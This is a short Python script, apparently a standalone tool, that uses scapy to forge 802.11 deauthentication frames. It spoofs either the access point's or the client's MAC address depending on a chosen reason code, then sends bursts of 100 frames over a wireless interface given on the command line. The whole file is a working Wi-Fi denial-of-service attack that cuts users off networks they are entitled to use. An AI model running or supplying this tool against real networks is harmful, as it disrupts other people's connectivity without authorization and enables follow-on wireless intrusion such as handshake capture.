from scapy.all import *
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

import config


def handle_deauth(ap_mac, sta_mac, reason_code):
    """
    Sends a deauth packet from the ap to the sta or from the sta to the ap depending on the reason code
    """

    match reason_code:
        case 1:
            send_deauth(source_mac=sta_mac, dest_mac=ap_mac, bssid=ap_mac, reason_code=1)
        case 4:
            send_deauth(source_mac=ap_mac, dest_mac=sta_mac, bssid=ap_mac, reason_code=4)
        case 5:
            send_deauth(source_mac=ap_mac, dest_mac=sta_mac, bssid=ap_mac, reason_code=5)
        case 8:
            send_deauth(source_mac=sta_mac, dest_mac=ap_mac, bssid=ap_mac, reason_code=8)
        case _:
            print("unknown reason code")


def send_deauth(dest_mac, source_mac, bssid, reason_code):
    packet_to_send = (
            # wlan header
            RadioTap() /
            # addr1 is receiver/destination
            # addr2 is transmitter/source
            # addr3 is BSS id (AP MAC)
            Dot11(addr1=dest_mac, addr2=source_mac, addr3=bssid) /
            # deauth packet
            Dot11Deauth(reason=reason_code)
    )
    sendp(packet_to_send, iface=config.WIFI_INTERFACE_NAME, count=100)


if len(sys.argv) < 4:
    print("usage : <command> <ap MAC> <sta MAC> <reason code>")

else:
    handle_deauth(sys.argv[1], sys.argv[2], int(sys.argv[3]))
